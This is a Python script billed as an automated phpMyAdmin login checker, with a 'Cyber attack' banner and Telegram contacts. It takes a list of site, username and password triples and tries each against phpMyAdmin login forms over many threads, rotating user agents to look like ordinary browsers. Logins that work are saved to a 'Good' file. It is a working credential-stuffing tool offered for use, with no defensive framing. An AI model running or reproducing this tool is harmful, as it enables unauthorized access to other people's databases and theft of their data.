# Copyright by CYBERALPHAWOLF-Xz
# Note: CYBERALPHAWOLF is copyrighted to --- XYZ
# T.me/XYZEAZ
import requests
import os
import platform
import logging
import random
from colorama import Fore, init
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import RequestException


init(autoreset=True)
logging.basicConfig(level=logging.CRITICAL, format='%(asctime)s - %(levelname)s - %(message)s')


user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'
]


FAILURE_MESSAGES = [
    "Cannot log in to the MySQL server",
    "Connection for controluser as defined in your configuration failed",
    "Access denied",
    "Wrong username/password",
    "Login without a password is forbidden",
    "Incorrect login",
    "Invalid token"
]


SUCCESS_INDICATORS = [
    "server_sql.php",  
    "pma_navigation.php",  
    "db_structure.php",  
    "Logout"  
]

def clear_terminal():
    os.system('cls' if platform.system() == 'Windows' else 'clear')

def print_banner():
    banner = """\033[1;33m\033[1m
██╗  ██╗███████╗     ██████╗ ██╗  ██╗██████╗ ███╗   ███╗██╗   ██╗ █████╗ ██████╗ ███╗   ███╗██╗███╗   ██╗
╚██╗██╔╝╚══███╔╝     ██╔══██╗██║  ██║██╔══██╗████╗ ████║╚██╗ ██╔╝██╔══██╗██╔══██╗████╗ ████║██║████╗  ██║
 ╚███╔╝   ███╔╝█████╗██████╔╝███████║██████╔╝██╔████╔██║ ╚████╔╝ ███████║██║  ██║██╔████╔██║██║██╔██╗ ██║
 ██╔██╗  ███╔╝ ╚════╝██╔═══╝ ██╔══██║██╔═══╝ ██║╚██╔╝██║  ╚██╔╝  ██╔══██║██║  ██║██║╚██╔╝██║██║██║╚██╗██║
██╔╝ ██╗███████╗     ██║     ██║  ██║██║     ██║ ╚═╝ ██║   ██║   ██║  ██║██████╔╝██║ ╚═╝ ██║██║██║ ╚████║
╚═╝  ╚═╝╚══════╝     ╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝     ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═════╝ ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝
    \033[0m"""


    tool_info = """
\033[1;37mTool Information:
▪ Purpose: Automated login checker for phpMyAdmin
▪ Program By: Junry Pacot | Junry's- Cyber attack
▪ T.me/Junrygwapo
▪ I Hope You Enjoy !
\033[0m"""


    terminal_width = os.get_terminal_size().columns


    banner_lines = banner.splitlines()
    centered_banner = "\n".join(line.center(terminal_width) for line in banner_lines)
    centered_tool_info = "\n".join(line.center(terminal_width) for line in tool_info.splitlines())


    print(centered_banner + "\n" + centered_tool_info)

def parse_line(line):

    parts = line.strip().split('|')
    return parts if len(parts) == 3 else (None, None, None)

def check(line):

    site, user, passwd = parse_line(line)
    if not site or not user or not passwd:
        print(Fore.RED + f"Invalid input format: {line}")
        return

    reset = "\033[0m"
    headers = {
        'User-Agent': random.choice(user_agents),
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'text/html'
    }

    try:
        response = requests.post(url=site, headers=headers, data={
            'pma_username': user,
            'pma_password': passwd,
            'server': '1',
            'submit': 'Login'
        }, timeout=5)

        current_time = datetime.now().strftime("%H:%M:%S")
        response_text = response.text.lower()


        if any(error.lower() in response_text for error in FAILURE_MESSAGES):
            result = (f"[\033[1;33m{current_time}{reset}] - [\033[1;37m{site}{reset}] - "
                      f"[\033[1;34m{user}{reset}] - [\033[1;34m{passwd}{reset}] - [\033[1;31mFailed login{reset}]")
            print(result)
            with open("Bad_phpMyAdmin.txt", "a", encoding="utf-8") as bad_file:
                bad_file.write(f"{site}|{user}|{passwd} - Failed login\n")
            return


        if any(success.lower() in response_text for success in SUCCESS_INDICATORS):
            result = (f"[\033[1;33m{current_time}{reset}] - [\033[1;37m{site}{reset}] - "
                      f"[\033[1;34m{user}{reset}] - [\033[1;34m{passwd}{reset}] - [\033[1;32mSuccess Logged in{reset}]")
            print(result)
            with open("Good_phpMyAdmin.txt", "a", encoding="utf-8") as good_file:
                good_file.write(f"{site}|{user}|{passwd}\n")
        else:

            result = (f"[\033[1;33m{current_time}{reset}] - [\033[1;37m{site}{reset}] - "
                      f"[\033[1;34m{user}{reset}] - [\033[1;34m{passwd}{reset}] - [\033[1;31mFailed login{reset}]")
            print(result)
            with open("Bad_phpMyAdmin.txt", "a", encoding="utf-8") as bad_file:
                bad_file.write(f"{site}|{user}|{passwd} - Failed login\n")

    except RequestException:
        result = (f"[\033[1;33m{current_time}{reset}] - [\033[1;37m{site}{reset}] - "
                  f"[\033[1;34m{user}{reset}] - [\033[1;34m{passwd}{reset}] - [\033[1;31mConnection Failed{reset}]")
        print(result)
        with open("Bad_phpMyAdmin.txt", "a", encoding="utf-8") as bad_file:
            bad_file.write(f"{site}|{user}|{passwd} - Connection Failed\n")

def load_list(filename, max_threads=20):

    try:
        with open(filename, 'r', encoding="utf-8") as file:
            lines = file.read().splitlines()

        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            executor.map(check, lines)

    except Exception as e:
        print(Fore.RED + f"An error occurred while processing the list: {str(e)}")

def main():

    clear_terminal()
    print_banner()

    list_file = input("\033[1;34mEnter The List \033[1;93m: \033[1;37m ")
    max_threads = input("\033[1;34mEnter the number of threads (default: 20)\033[1;93m: \033[1;37m") or 20

    try:
        max_threads = int(max_threads)
    except ValueError:
        print(Fore.RED + "Invalid thread count. Using default value of 20.")
        max_threads = 20

    load_list(list_file, max_threads)

if __name__ == "__main__":
    main()
